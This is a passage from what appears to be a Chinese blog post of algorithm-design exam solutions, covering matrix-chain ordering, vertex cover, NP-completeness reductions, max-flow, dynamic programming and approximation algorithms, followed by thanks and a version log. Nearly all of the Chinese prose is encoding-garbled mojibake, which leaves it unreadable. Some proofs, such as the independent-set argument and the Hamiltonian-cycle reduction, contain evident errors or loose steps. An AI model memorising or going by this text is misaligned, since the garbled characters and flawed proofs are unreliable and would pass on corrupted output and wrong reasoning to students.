| *j* = 2 | *j* = 3 | *j* = 4 | *j* = 5 |\n| ------------- | ------- | ------- | ------- | ------- | ------- |\n| *i* = 1       | /       | 1       | 2       | 2       | `2`     |\n| *i* = 2       | /       | /       | 2       | 2       | 2       |\n| *i* = 3       | /       | /       | /       | 3       | `4`     |\n| *i* = 4       | /       | /       | /       | /       | 4       |\n| *i* = 5       | /       | /       | /       | /       | /       |\n\n s(1,5) = 2 å› æ­¤çŸ©é˜µé“¾åœ¨A<sub>2</sub>å’ŒA<sub>3</sub>ä¹‹é—´æ–­å¼€ï¼Œåˆ™åŠ æ‹¬å·æ–¹å¼ä¸º **(A<sub>1</sub>A<sub>2</sub>)(A<sub>3</sub>A<sub>4</sub>A<sub>5</sub>)**\n\ns(3,5) = 4 å› æ­¤çŸ©é˜µé“¾åœ¨A<sub>4</sub>å’ŒA<sub>5</sub>ä¹‹é—´æ–­å¼€ï¼Œåˆ™åŠ æ‹¬å·æ–¹å¼ä¸º **(A<sub>1</sub>A<sub>2</sub>)((A<sub>3</sub>A<sub>4</sub>)A<sub>5</sub>)**\n\næœ€ä¼˜åŠ æ‹¬å·æ–¹å¼ä¸º**(A<sub>1</sub>A<sub>2</sub>)((A<sub>3</sub>A<sub>4</sub>)A<sub>5</sub>)**\n\n------\n\n#### 2019\n\nå››ã€ç®€å•è¯æ˜å®šä»·ç®—æ³•ï¼ˆPricing methodï¼‰æ±‚è§£å¸¦æƒé‡çš„ç‚¹è¦†ç›–ï¼ˆWeighted Vertex Coverï¼‰é—®é¢˜æ˜¯2å€è¿‘ä¼¼çš„ã€‚\n\nç­”ï¼š S ä¸ºç®—æ³•ç»ˆæ­¢æ—¶æ‰€æœ‰ç´§èŠ‚ç‚¹çš„é›†åˆã€‚æ˜“å¾— S æ˜¯é¡¶ç‚¹è¦†ç›–ï¼ˆåè¯ï¼šå¦‚æœæŸæ¡è¾¹æ²¡æœ‰è¢«è¦†ç›–åˆ°ï¼Œåˆ™å…¶ä¸¤ä¸ªç«¯ç‚¹éƒ½æ²¡æœ‰è¦†ç›–å¾ˆç´§ï¼Œç®—æ³•ä¸ä¼šç»ˆæ­¢ï¼‰\n\nw(S) ç­‰äºæ‰€é€‰çš„èŠ‚ç‚¹çš„æƒå€¼ä¹‹å’Œï¼Œç­‰äºæ‰€é€‰èŠ‚ç‚¹æ‰€å¯¹åº”çš„è¾¹æƒä¹‹å’Œï¼Œå¯ä»¥æŠŠå®ƒæ”¾å¤§åˆ°æ‰€æœ‰èŠ‚ç‚¹å¯¹åº”è¾¹æƒä¹‹å’Œï¼Œè¿™æ ·å› ä¸ºä¸€æ¡è¾¹ (u, v) åœ¨ u ä¸Šç®—è¿‡ä¸€æ¬¡åè¿˜è¦åœ¨ v ä¸Šç®—ä¸€æ¬¡ï¼Œæ‰€ä»¥ç­‰äºè¾¹æƒå’Œçš„ä¸¤å€ã€‚å†ç”±ä¸Šé¢å…¬å¹³å¼•ç†å¯å¾—ã€‚\n\n![](https://img.jwt1399.top/img/202111131352401.png)\n\nâˆ´ å®šä»·ç®—æ³•æ˜¯2å€è¿‘ä¼¼ç®—æ³•\n\n------\n\näº”ã€è¯æ˜ç‹¬ç«‹é›†é—®é¢˜ï¼ˆç»™å®šä¸€ä¸ªå›¾ï¼Œé—®å›¾ä¸­æ˜¯å¦å­˜åœ¨kä¸ªé¡¶ç‚¹çš„å­é›†ï¼Œä½¿å¾—è¿™ä¸ªå­é›†ä¸­ä»»æ„ä¸¤ä¸ªé¡¶ç‚¹ä¹‹é—´åœ¨åŸå›¾ä¸­éƒ½ä¸å­˜åœ¨è¾¹ï¼‰æ˜¯NPå®Œå…¨çš„ã€‚\n\nç­”ï¼šä»ç‚¹è¦†ç›–é—®é¢˜è§„çº¦è¿‡æ¥\n\n**â‡’** \n\nâ€‹\tS æ˜¯å›¾ G çš„ä»»ä¸€ç‹¬ç«‹é›†\nâ€‹\tåˆ™ä»»æ„è¾¹ (u,v) âˆˆ Eï¼Œæœ‰u âˆ‰ S æˆ– v âˆ‰ S æˆ– u,v éƒ½ âˆ‰ Sï¼›é‚£ä¹ˆ uâˆˆV-S æˆ– vâˆˆV-S æˆ– u,v éƒ½ âˆˆ S\nâ€‹\tæ‰€ä»¥å›¾çš„ä»»æ„è¾¹ (u,v) è‡³å°‘æœ‰ä¸€ä¸ªé¡¶ç‚¹åœ¨é›†åˆ V-S ä¸­ï¼Œå³é›†åˆ V-S æ˜¯ä¸€ä¸ªé¡¶ç‚¹è¦†ç›–\n\n**â‡** \n\nâ€‹\tV-S æ˜¯å›¾ G çš„ä»»ä¸€é¡¶ç‚¹è¦†ç›–\nâ€‹\tåˆ™ä»»æ„è¾¹ (u,v) âˆˆ Eï¼Œæœ‰ u âˆˆ V-S æˆ– v âˆˆ V-S æˆ– u,v éƒ½ âˆˆ V-S ï¼›é‚£ä¹ˆ u âˆ‰ S æˆ– v âˆ‰ S æˆ– u,v éƒ½ âˆ‰ V-S\nâ€‹\tæ‰€ä»¥å›¾çš„ä»»æ„è¾¹è‡³å°‘æœ‰ä¸€ä¸ªç«¯ç‚¹ä¸åœ¨é›†åˆ S ä¸­ï¼Œé›†åˆ S æ˜¯ä¸€ä¸ªç‹¬ç«‹é›†\n\nâˆ´  Vertex-Cover â‰¤<sub>p</sub> Independent Setï¼Œå³ç‹¬ç«‹é›†é—®é¢˜NPå®Œå…¨çš„\n\n------\n\nå…­ã€æ±‚å¦‚ä¸‹æœ‰å‘å›¾ä¸­så’Œté—´çš„æœ€å°å‰²ï¼Œå…¶ä¸­è¾¹ä¸Šçš„æ•°å­—è¡¨ç¤ºè¾¹çš„å®¹é‡ï¼Œè¦æ±‚ç»™å‡ºæœ€å°‘ä¸¤ä¸ªä¸­é—´è®¡ç®—æ­¥éª¤(8åˆ†)ã€‚\n\n![](https://img.jwt1399.top/img/202112071837771.png)\n\nå°†æœ€å°å‰²é—®é¢˜è½¬åŒ–ä¸ºæœ€å¤§æµé—®é¢˜\n\n1å¢å¹¿è·¯å¾„ï¼š(*s*, *u*, *v*, *t*)ï¼Œæµé‡å€¼+10\n\n2å¢å¹¿è·¯å¾„ï¼š(*s*, *y*, *z*, *t*)ï¼Œæµé‡å€¼+10\n\n3å¢å¹¿è·¯å¾„ï¼š(*s*, *w*, *x*, t)ï¼Œæµé‡å€¼+18\n\n4å¢å¹¿è·¯å¾„ï¼š(*s*, *y*, *x*, *w*, *v*, *t*)ï¼Œæµé‡å€¼+4\n\næœ€å°å‰²ä¸º**[ {*s*,*y*,*z*}ï¼Œ{*w*,*x*,*u*,*v*,*t*} ]** å®¹é‡ä¸º **10+10+18+4=42**\n\n------\n\nä¸ƒã€è¯æ˜å›¾äºŒç€è‰²é—®é¢˜ï¼ˆæ˜¯å¦èƒ½ç»™ä¸€ä¸ªå›¾çš„é¡¶ç‚¹è¿›è¡Œä¸¤ç§é¢œè‰²ç€è‰²ä½¿å¾—ä»»æ„ä¸¤ä¸ªç›¸é‚»é¡¶ç‚¹éƒ½æœ‰ä¸åŒçš„é¢œè‰²ï¼‰æ˜¯å±äºPçš„ã€‚(8åˆ†)\n\nå¦‚æœåªç”¨2ç§é¢œè‰²ï¼Œé‚£ä¹ˆç¡®å®šä¸€ä¸ªé¡¶ç‚¹çš„é¢œè‰²ä¹‹åï¼Œå’Œå®ƒç›¸é‚»çš„é¡¶ç‚¹çš„é¢œè‰²ä¹Ÿå°±ç¡®å®šäº†ã€‚å› æ­¤ï¼Œé€‰æ‹©ä»»æ„ä¸€ä¸ªé¡¶ç‚¹å‡ºå‘ï¼Œä¾æ¬¡ç¡®å®šç›¸é‚»é¡¶ç‚¹çš„é¢œè‰²ï¼Œå°±å¯ä»¥åˆ¤æ–­æ˜¯å¦å¯ä»¥è¢«2ç§é¢œè‰²ç€è‰²äº†ã€‚è¿™ä¸ªé—®é¢˜å¦‚æœç”¨æ·±åº¦ä¼˜å…ˆæœç´¢çš„è¯ï¼Œèƒ½å¤Ÿç®€å•åœ°å®ç°ã€‚\n\n------\n\n![](https://img.jwt1399.top//img/20211013180909.png)\n\nè®¾ `p(j)` ä¸ºä¸å·¥ä½œ j ç›¸å®¹çš„æœ€å¤§çš„å·¥ä½œ i ä¸” i < j ã€‚`OPT(j)`è¡¨ç¤ºå‰ j ä¸ªå·¥ä½œ ( 1,2,3,â€¦,j )çš„æœ€å¤§çš„å·¥ä½œæƒé‡ã€‚åˆ™é€’å½’å…³ç³»å¼ä¸ºï¼š\n\n![](https://img.jwt1399.top//img/20211013181235.png)\n\nä¾æ®é€’æ¨å…¬å¼ï¼Œè®¡ç®—å‡º  `p(j)`ã€`OPT(j)`\n\n![](https://img.jwt1399.top//img/20211013181844.png)\n\nå› ä¸º OPT(17) = 50 ï¼Œå› æ­¤**æœ€å¤§æƒé‡ä¹‹å’Œä¸º 50**\n\nOPT(17) = OPT(16) = OPT(15) = 50 ï¼Œé€‰æ‹©æ´»åŠ¨ 15ï¼Œp(15) =13ï¼›\n\nOPT(13) = OPT(12) = 45 ï¼Œé€‰æ‹©æ´»åŠ¨ 12ï¼Œp(12) = 7ï¼›\n\nOPT(7) = OPT(6) = 25 ï¼Œé€‰æ‹©æ´»åŠ¨ 6ï¼Œp(6) = 3ï¼›\n\nOPT(3) = 18 ï¼Œp(3) = 0ï¼Œé€‰æ‹©æ´»åŠ¨ 3ï¼Œä¸”é€‰æ‹©å®Œæ¯•ã€‚\n\nå› æ­¤**æœ€ä¼˜æ´»åŠ¨å­é›†ä¸º 3ã€6ã€12ã€15**\n\n------\n\nä¹ã€å¯¹äºä¸‰ç€è‰²é—®é¢˜ï¼Œè‹¥å­˜åœ¨ä¸€ä¸ªå¤šé¡¹å¼æ—¶é—´ç®—æ³•åˆ¤æ–­ä¸€ä¸ªå›¾æ˜¯å¦å¯ä»¥ä¸‰ç€è‰²ï¼Œåˆ™å­˜åœ¨ä¸€ä¸ªå¤šé¡¹å¼æ—¶é—´ç®—æ³•å¯¹å¯ä»¥è¿›è¡Œä¸‰ç€è‰²çš„å›¾æ‰¾åˆ°ä¸€ä¸ªå¯è¡Œçš„ä¸‰ç€è‰²ã€‚\n\nè§£æ³•ä¸€ï¼šä¸æ–­åŠ è¾¹è¿›å»ç„¶åè¿›è¡Œåˆ¤æ–­ï¼Œç›´åˆ°ä¸èƒ½åŠ è¾¹ä¸ºæ­¢ã€‚è¿™æ ·ä¸‰ç§é¢œè‰²çš„ç‚¹å°±æ˜¯å›¾ä¸­ä¸‰ä¸ªç‹¬ç«‹é›†ã€‚  \n\nè§£æ³•äºŒï¼šä¸æ–­å°†ä¸¤ä¸ªä¸ç›¸é‚»çš„ç‚¹åˆå¹¶æˆä¸€ä¸ªç‚¹ç„¶åè¿›è¡Œåˆ¤æ–­ï¼Œç›´åˆ°ä¸èƒ½å†åˆå¹¶ä¸ºæ­¢ã€‚æœ€åå‰©ä¸‹ä¸‰ä¸ªç‚¹ã€‚\n\n------\n\n#### 2020\n\nä¸‰ã€ç»™å®šä»»æ„è¿é€šçš„æ— å‘æœ‰æƒå›¾Gï¼Œæ¯æ¡è¾¹ä¸Šçš„æƒé‡c(e)éƒ½æ˜¯ä¸åŒçš„æ•´æ•°ã€‚Gçš„æœ€å°ç”Ÿæˆæ ‘æ˜¯Gçš„ä¸€ä¸ªè¿é€šçš„ã€æ— åœˆçš„ã€è¾¹çš„æƒé‡ä¹‹å’Œæœ€å°çš„åŒ…å«å›¾ä¸­æ‰€æœ‰é¡¶ç‚¹çš„å­å›¾ã€‚å¦‚æœe\\*æ˜¯å›¾Gä¸Šæƒé‡æœ€å°çš„è¾¹ï¼Œé‚£ä¹ˆä¸€å®šæœ‰ä¸€æ£µå›¾Gçš„æœ€å°ç”Ÿæˆæ ‘TåŒ…å«è¾¹e*ã€‚è¯·é—®è¿™ä¸ªå‘½é¢˜æ˜¯å¦æ­£ç¡®,å¦‚æœæ­£ç¡®ï¼Œè¯·ç»™å‡ºè¯æ˜ã€‚å¦‚æœä¸æ­£ç¡®,è¯·ç»™å‡ºåä¾‹ã€‚(8åˆ†)\n\nç­”ï¼šæ­£ç¡®\n\n------\n\nå››ã€å·¥å‚sç”Ÿäº§çš„å•†å“é€šè¿‡ä¸‹å›¾è¡¨ç¤ºçš„è¿è¾“ç½‘ç»œè¿é€åˆ°å¸‚åœºtï¼Œç½‘ç»œä¸­è¾¹ä¸Šçš„æ•°å€¼è¡¨ç¤ºå•ä½æ—¶é—´å¯ä»¥é€šè¿‡è¯¥è¾¹çš„å•†å“æ•°é‡çš„ä¸Šé™ï¼Œæ±‚å•ä½æ—¶é—´å†…ä»å·¥å‚såˆ°å¸‚åœºtèƒ½è¿é€çš„æœ€å¤§å•†å“æ€»é‡ã€‚è¦æ±‚ç»™å‡ºæ±‚è§£è¿‡ç¨‹(ç»™å‡ºæ¯æ¡å¢å¹¿è·¯å¾„åŠå…¶å¢åŠ çš„æµé‡å€¼)ã€‚(8åˆ†)\n\n![](https://img.jwt1399.top/img/202112071837710.png)\n\n1å¢å¹¿è·¯å¾„ï¼š(*s*, *s1*, *t*, *v1*, *t1*, *t*)ï¼Œæµé‡å€¼+10\n\n2å¢å¹¿è·¯å¾„ï¼š(*s*, *s2*, *v5*, *t2*, *t*)ï¼Œæµé‡å€¼+10\n\n3å¢å¹¿è·¯å¾„ï¼š(*s*, *s1*, *v2*, *v3*, *v4*, *t1*, *t*)ï¼Œæµé‡å€¼+5\n\n4å¢å¹¿è·¯å¾„ï¼š(*s*, *s2*, *v2*, *v1*, *t1*, *t*)ï¼Œæµé‡å€¼+4\n\n5å¢å¹¿è·¯å¾„ï¼š(*s*, *s2*, *v5*, *v3*, *v4*, *t2*, *t*)ï¼Œæµé‡å€¼+3\n\n**æœ€å¤§æµ 10 + 10 + 5 + 4 + 3 = 32**\n\n------\n\näº”ã€è‹¥ç»™å®šä¸¤ä¸ªåºåˆ— X = (x<sub>1</sub>,x<sub>2</sub>,x<sub>3</sub>,...,x<sub>n</sub>) å’Œ Y = (y<sub>1</sub>,y<sub>2</sub>,y<sub>3</sub>,...,y<sub>m</sub>) ã€å¦‚æœå¯¹äºæ‰€æœ‰ j = 1,2,3,.,m-1 æœ‰ y<sub>jÂ </sub>< y<sub>j+1</sub> å¹¶ä¸”å­˜åœ¨ä¸€ä¸ªä¸¥æ ¼é€’å¢ä¸‹æ ‡åºåˆ— (i<sub>1</sub>,i<sub>2</sub>,i<sub>3</sub>,...,i<sub>k</sub>) ä½¿å¾—å¯¹äºæ‰€æœ‰ j = 1,2,3,â€¦,m æœ‰ y<sub>j</sub> = x<sub>iÂ </sub>ï¼Œåˆ™ç§° Y æ˜¯ X çš„å•è°ƒé€’å¢å­åºåˆ—ã€‚(8åˆ†)\n\n(1)ç»™å‡ºåŠ¨æ€è§„åˆ’ç®—æ³•æ±‚ç»™å®šåºåˆ—æœ€é•¿å•è°ƒé€’å¢å­åºåˆ—é•¿åº¦çš„é€’å½’å…³ç³»å¼ã€‚\n\nå¯¹äºæ•°ç»„åºåˆ— Y<sub>i</sub> ( 1 â‰¤ i â‰¤ m ) ï¼Œä»¤ dp[i] è¡¨ç¤ºä»¥ç¬¬ i ä¸ªæ•° Y<sub>i</sub> ç»“å°¾çš„æœ€é•¿é€’å¢å­åºåˆ—çš„é•¿åº¦ã€‚é‚£ä¹ˆï¼Œæˆ‘ä»¬è€ƒè™‘ä»¥ç¬¬ i ä¸ªæ•° Y<sub>i</sub>  ç»“å°¾çš„æœ€é•¿é€’å¢å­åºåˆ—ï¼Œå®ƒåœ¨è¿™ä¸ªåºåˆ—ä¸­çš„å‰ä¸€ä¸ªæ•° Y<sub>j</sub> ( 1 â‰¤ j < i )ï¼Œæ‰€ä»¥ï¼Œå¦‚æœæˆ‘ä»¬å·²ç»çŸ¥é“äº† dp[j]ï¼Œé‚£ä¹ˆå°±æœ‰ dp[i] = dp[j] + 1 ã€‚æ˜¾ç„¶ï¼Œæˆ‘ä»¬è¿˜éœ€è¦æ»¡è¶³ Y<sub>j</sub> < Y<sub>i</sub>ï¼Œè¿™ä¸ªé€’å¢çš„é™åˆ¶æ¡ä»¶ã€‚\n\né€’å½’å…³ç³»å¼ï¼šdp[i] = max<sub>j=1</sub>( dp[j] âˆ£ Y<sub>j</sub> < Y<sub>i</sub> ) + 1\n\n(2)æ±‚è§£åºåˆ—(a,l,g,o,r,i,t,h,m)çš„æœ€é•¿å•è°ƒé€’å¢å­åºåˆ—,ç”»å‡ºæ±‚è§£è¿‡ç¨‹è¡¨æ ¼ã€‚\n\n![](https://img.jwt1399.top/img/image-20211208230832866.png)\n\næœ€é•¿å•è°ƒé€’å¢å­åºåˆ—ï¼šaï¼Œlï¼Œoï¼Œrï¼Œt æˆ– aï¼Œgï¼Œoï¼Œrï¼Œt\n\n------\n\nå…­ã€åˆ¤å®šé—®é¢˜Aï¼šç»™å®šåŒ…å«å¥‡æ•°ä¸ªç»“ç‚¹çš„ç®€å•æ— å‘å›¾ï¼Œåˆ¤æ–­å…¶æ˜¯å¦åŒ…å«å“ˆå¯†å°”é¡¿åœˆï¼›åˆ¤å®šé—®é¢˜Bï¼šç»™å®šåŒ…å«å¶æ•°ä¸ªç»“ç‚¹çš„ç®€å•æ— å‘å›¾ï¼Œåˆ¤æ–­å…¶æ˜¯å¦åŒ…å«å“ˆå¯†å°”é¡¿åœˆï¼›è¯æ˜é—®é¢˜Aå¯å¤šé¡¹å¼å½’çº¦åˆ°é—®é¢˜Bã€‚\n\nè®¾å¥‡æ•°ä¸ªèŠ‚ç‚¹çš„ç®€å•æ— å‘å›¾ä¸º Gã€‚\n\næ„é€ æ–¹æ³•ä¸ºï¼šéšæœºåœ¨ G ä¸­é€‰æ‹©ä¸€ä¸ªç‚¹ uï¼Œå‡è®¾è¿™ä¸ªç‚¹ u å­˜åœ¨ k æ¡è¾¹ï¼Œæˆ‘ä»¬æ–­å¼€ä¸€æ¡è¾¹æ·»åŠ ä¸€ä¸ªç‚¹ wï¼Œå°† w è¿æ¥åˆ°æ–­å¼€è¾¹çš„ä¸¤ä¸ªé¡¶ç‚¹ï¼Œè¿™æ ·ä¾¿æ„é€ äº†ä¸€ä¸ªå¶æ•°ä¸ªé¡¶ç‚¹çš„å›¾ G'ï¼Œä¾æ¬¡æ–­å¼€è¿™ k æ¡è¾¹åŠ ç‚¹ï¼Œè¿™æ ·æˆ‘ä»¬å¯ä»¥æ„é€  k ä¸ª G' ï¼Œåˆ™åœ¨è¿™ k ä¸ª G' ä¸­è‚¯å®šèƒ½æ‰¾åˆ°ä¸€ä¸ª G' å­˜åœ¨ä¸€æ¡è¾¹ (u,v) æ˜¯åœ¨å“ˆå¯†å°”é¡¿åœˆä¸­ï¼Œåˆ™è¿™ä¸ªå›¾ G' è‚¯å®šæ»¡è¶³å¥‡æ•°ç»“ç‚¹çš„ç®€å•æ— å‘å›¾åŒ…å«å“ˆå¯†å°”é¡¿å½“ä¸”ä»…å½“å¶æ•°ç»“ç‚¹çš„ç®€å•æ— å‘å›¾åŒ…å«å“ˆå¯†å°”é¡¿ã€‚\n\nå¤§å®¶å¯ä»¥åœ¨è¯„è®ºåŒºç•™ä¸‹ä½ æƒ³æ³•ï¼Œä¸€èµ·äº¤æµï¼\n\n------\n\nä¸ƒã€å¦‚æœå­˜åœ¨åˆ¤æ–­ä»»æ„ç®€å•æ— å‘å›¾æ˜¯å¦å­˜åœ¨å“ˆå¯†å°”é¡¿åœˆçš„å¤šé¡¹å¼æ—¶é—´ç®—æ³•ï¼Œè¯·ä½ è®¾è®¡æ„é€ ä»»æ„ç®€å•æ— å‘å›¾çš„å“ˆå¯†å°”é¡¿åœˆï¼ˆå¦‚æœå­˜åœ¨çš„è¯ï¼‰çš„å¤šé¡¹å¼æ—¶é—´ç®—æ³•ã€‚\n\nç®—æ³•ï¼š\n\n//è®¾è¯¥åˆ¤æ–­ç®—æ³•ä¸ºA\nS åˆå§‹åŒ–ä¸ºç©ºé›†ï¼›\né¦–å…ˆç®—æ³• A åˆ¤æ–­å›¾ G ä¸­æ˜¯å¦å­˜åœ¨å“ˆå¯†å°”é¡¿åœˆï¼Œå¦‚æœä¸å­˜åœ¨åˆ™ç®—æ³•ç»“æŸï¼Œå¦‚æœå­˜åœ¨åˆ™ç»§ç»­å¯»æ‰¾å“ˆå¯†å°”é¡¿åœˆï¼›\nFor every edge e in G {\n\tå¦‚æœ G â€“ {e}ä¸­ä¸å­˜åœ¨å“ˆå¯†å°”é¡¿åœˆï¼Œåˆ™å°† e æ·»åŠ åˆ°é›†åˆ S ä¸­ï¼›\n\tå¦åˆ™ G = G â€“ {e}ï¼›\n} \næœ€ç»ˆæ‰€å¾—é›†åˆ S ä¸­çš„æ‰€æœ‰è¾¹æ„æˆå›¾ G çš„å“ˆå¯†å°”é¡¿åœˆã€‚\n\n------\n\nå…«ã€ç»™å®šæ­£æ•´æ•°é›†åˆ A = {a<sub>1</sub>,a<sub>2</sub>,a<sub>3</sub>,â€¦,a<sub>n</sub>} å’Œæ­£æ•´æ•° bï¼Œb â‰¥ max {a<sub>1</sub>,a<sub>2</sub>,a<sub>3</sub>,â€¦,a<sub>n</sub>}ã€‚å½“é›†åˆ A çš„å­é›† SâˆˆA ä¸­çš„å…ƒç´ ä¹‹å’Œå°äºç­‰äº b æ—¶ï¼Œå³ âˆ‘<sub>a<sub>i</sub>âˆˆS[i]</sub> a<sub>i</sub>â‰¤bï¼Œæˆ‘ä»¬ç§° S ä¸ºå¯è¡Œé›†ã€‚è¯·å¯»æ‰¾å…ƒç´ ä¹‹å’Œæœ€å¤§çš„å¯è¡Œé›† S ã€‚ä¾‹å¦‚ï¼ŒA = {8,2,4}ï¼Œb= 11ï¼Œåˆ™æœ€ä¼˜çš„å¯è¡Œé›†ä¸º S = {8,2}ï¼Œæœ€ä¼˜è§£ä¸º 8ï¼‹2=10 (10åˆ†)\n\n(1)ä¸‹é¢æ˜¯æ±‚è§£è¿™ä¸ªé—®é¢˜çš„ç®—æ³•ã€‚é›†åˆ S åˆå§‹ä¸ºç©ºé›†ï¼›æŒ‰ç…§ä¸‹æ ‡ i ä»å°åˆ°å¤§çš„é¡ºåºä¾æ¬¡è€ƒå¯Ÿé›†åˆ A ä¸­çš„æ¯ä¸ªæ•´æ•° a<sub>i</sub>ï¼Œå¦‚æœ Î±<sub>i</sub> + âˆ‘<sub>a<sub>k</sub>âˆˆS</sub> a<sub>k</sub>ï¼œb ï¼Œåˆ™å°† a<sub>iÂ </sub>æ·»åŠ é›†åˆ S ä¸­ï¼Œå³ S = S U {a<sub>i</sub>}ã€‚è¯æ˜è¿™ä¸ªç®—æ³•ä¸æ˜¯1/2å€è¿‘ä¼¼ç®—æ³•ã€‚(3åˆ†)\n\n------\n\nè®¾é›†åˆ A = {1ï¼Œ4}ï¼Œb = 4\n\næ ¹æ®è¯¥ç®—æ³•æ±‚å¾—å¯è¡Œé›† S = {1} ï¼Œè§£ä¸º âˆ‘S = 1 \n\nâ€‹           è€Œæœ€ä¼˜å¯è¡Œè§£ S* = {4}ï¼Œæœ€ä¼˜è§£ âˆ‘S* = 4\n\nâ‡’ âˆ‘S = (1/4)âˆ‘S* < (1/2)âˆ‘S*\n\nâˆ´è¯¥ç®—æ³•ä¸æ˜¯1/2å€è¿‘ä¼¼ç®—æ³•\n\n------\n\n(2)ä¸ºè¯¥é—®é¢˜è®¾è®¡O(nlogn)æ—¶é—´å¤æ‚åº¦çš„è¿‘ä¼¼ç®—æ³•ï¼Œå¹¶è¯æ˜è¯¥ç®—æ³•æ˜¯1/2å€è¿‘ä¼¼ç®—æ³•(7åˆ†)\n\n------\n\nåœ¨ (1) ä¸­ æ‰€ç»™ç®—æ³•åŸºç¡€ä¸Šå¯¹é›†åˆ A è¿›è¡Œé™åºå½’å¹¶æ’åº[O(nlogn)]\n\nå³ï¼š a<sub>1</sub>ï¼a<sub>2</sub>ï¼a<sub>3</sub>ï¼â€¦ï¼a<sub>k</sub>ï¼a<sub>k+1</sub>ï¼...ï¼a<sub>n</sub>\n\nè¯æ˜ï¼šè®¾ a<sub>k</sub> ä¸ºå¯è¡Œé›†æœ€åä¸€ä¸ªå…ƒç´ \n\na<sub>kÂ </sub>â‰¥ a<sub>k+1Â </sub>â‡’ âˆ‘S â‰¥ a<sub>k+1 </sub>   ------â‘ \n\na<sub>k</sub> ä¸ºå¯è¡Œé›†æœ€åä¸€ä¸ªå…ƒç´  â‡’ âˆ‘S â‰¥ b - a<sub>k+1 </sub>------â‘¡\n\nâ‘ +â‘¡ ï¼š âˆ‘S â‰¥ (1/2)b ï¼Œå†åˆ b â‰¥ âˆ‘S*\n\nâ‡’âˆ‘S â‰¥ (1/2)âˆ‘S*\n\nâˆ´ è¯¥ç®—æ³•æ˜¯ 1/2 å€è¿‘ä¼¼ç®—æ³•\n\n------\n\n#### 2021\n\n> è€ƒè¯•ç»“æŸå•¦ï¼Œè€ƒå¾—ä¸€å¡Œç³Šæ¶‚ï¼Œä»¥ä¸‹æ˜¯æˆ‘çš„å›å¿†\n\nå¤§é¢˜ï¼š\n\n- æ¸è¿›å¢é•¿ç‡æ’åº\n\n- çŸ©é˜µè¿ä¹˜ï¼Œæ±‚æœ€å°è®¡ç®—æ¬¡æ•°å’Œæœ€ä¼˜åŠ æ‹¬å·æ–¹å¼\n\n- è´ªå¿ƒç®—æ³•æ­£ç¡®æ€§è¯æ˜(æ‰¾é›¶é’±)\n\n- åˆ†æ²»ç®—æ³•(ç±»ä¼¼2020å¹´Lå‹éª¨ç‰Œè¦†ç›–)\n- ç½‘ç»œæµ(è·Ÿ2020å¹´çš„å›¾ç›¸ä¼¼)\n- å½’çº¦(3ç€è‰²å½’çº¦åˆ°kç€è‰²)\n- è‡ªå½’çº¦(æ”¯é…é›†)\n- è¿‘ä¼¼ç®—æ³•(ç»™äº†ä¸€ä¸ªç®—æ³•ï¼Œè¯æ˜ä¸æ˜¯1/2å€ç®—æ³•)\n- æœ€å¤§è¿ç»­å­åºåˆ—(ç»™å‡ºé€’å½’å…³ç³»å¹¶æ±‚è§£)\n\n## â‘©æ€»ç»“&æ„Ÿè°¢\n\nçœ‹åˆ°è¿™é‡Œä½ å·²ç»çœ‹å®Œäº†æ‰€æœ‰æ­£æ–‡éƒ¨åˆ†äº†ï¼Œç›¸ä¿¡ä½ å¯¹ç®—æ³•è®¾è®¡ä¹Ÿæœ‰äº†å¤§è‡´çš„äº†è§£ï¼Œè¿˜æ˜¯å¸Œæœ›æ­¤æ–‡æˆ–å¤šæˆ–å°‘å¯¹ä½ äº§ç”Ÿäº†ä¸€äº›å¸®åŠ©å§ï¼Œè¿™ä¹Ÿæ˜¯å°ç®€å†™æ­¤æ–‡çš„åˆè¡·ä¹‹ä¸€ã€‚åé¢çš„å†…å®¹æ˜¯æœ¬æ–‡çš„ç‰ˆæœ¬ç®¡ç†è®°å½•ï¼Œè®°å½•äº†å°ç®€å†™æ­¤æ–‡çš„è¿‡ç¨‹ï¼Œç„¶åæ˜¯æœ¬æ–‡çš„å‚è€ƒä¹¦ç±å’Œå‚è€ƒæ–‡ç« ï¼Œæœ€åæ˜¯è¯»è€…å¯¹å°ç®€çš„èµåŠ©æ¸ é“ã€‚ï¼ˆèµåŠ©å°†ç”¨äºæœ¬åšå®¢è¿è¥ã€CDNå’ŒOBSç»­è´¹ã€‘ï¼‰\n\né¦–å…ˆæ„Ÿè°¢å„ä½å‰è¾ˆæ‰€å†™æ–‡ç« ï¼Œæ²¡æœ‰ä»–ä»¬æœ¬æ–‡ä¹Ÿæ— æ³•å®Œæˆï¼Œå…¶æ¬¡è‡ªä»æ–‡ç« å¼€æ”¾ä»¥æ¥ï¼Œæ”¶åˆ°å¾ˆå¤šè¯»è€…å¯¹æ–‡ç« é”™è¯¯æŒ‡æ­£çš„æ¶ˆæ¯ä»¥åŠæ”¶åˆ°éƒ¨åˆ†è¯»è€…çš„èµåŠ©ï¼Œè¿™é‡Œå°±ä¸ä¸€ä¸€åˆ—å‡ºäº†ï¼Œå°ç®€åœ¨æ­¤çœŸè¯šçš„æ„Ÿè°¢å¤§å®¶ï¼ğŸ™ğŸ™\n\næœ€åè¿˜æƒ³é€ç»™è¯»è€…ä¸€å¥è¯ï¼Œæ…¢æ…¢æ¥ï¼Œæ¯”è¾ƒå¿«ï¼\n\n## â‘ªç‰ˆæœ¬ç®¡ç†\n\n### v 1.0(2021-10-17)\n\n- åˆæ­¥æ„å»ºç®—æ³•ç¬”è®°`åŸºæœ¬æ¡†æ¶`\n- å®Œæˆ`ç®—æ³•å¼•è®º`ã€`ç®—æ³•å¤æ‚åº¦`ã€`ç½‘ç»œæµ`å…¨éƒ¨ç« èŠ‚æ’°å†™\n- å®Œæˆ`è´ªå¿ƒç®—æ³•`ã€`åˆ†æ²»ç®—æ³•`ã€`åŠ¨æ€è§„åˆ’`éƒ¨åˆ†ç« èŠ‚æ’°å†™\n\n### v 1.1(2021-10-21)\n\n- ä¿®å¤è‹¥å¹²`å·²çŸ¥é”™è¯¯`(æ„Ÿè°¢@tzjã€@whh)\n- ä¼˜åŒ–è‹¥å¹²`å°ç»†èŠ‚`\n- å®Œå–„`æ¸è¿‘å¢é•¿ç‡`æ¯”è¾ƒä¹ é¢˜è§£ç­”\n- æ–°å¢`åŠ¨æ€è§„åˆ’`çœŸé¢˜ç»ƒä¹ \n- æ–°å¢`ä»»æ„æµ`ä¸`ä»»æ„å‰²`å…³ç³»\n\n### v 1.2(2021-11-12)\n\n- æ–°å¢`åˆ¤æ–­é—®é¢˜`å’Œ`ä¼˜åŒ–é—®é¢˜`æ¦‚å¿µ\n- æ–°å¢`NPå®Œå¤‡æ€§`ç†è®ºç« èŠ‚\n- 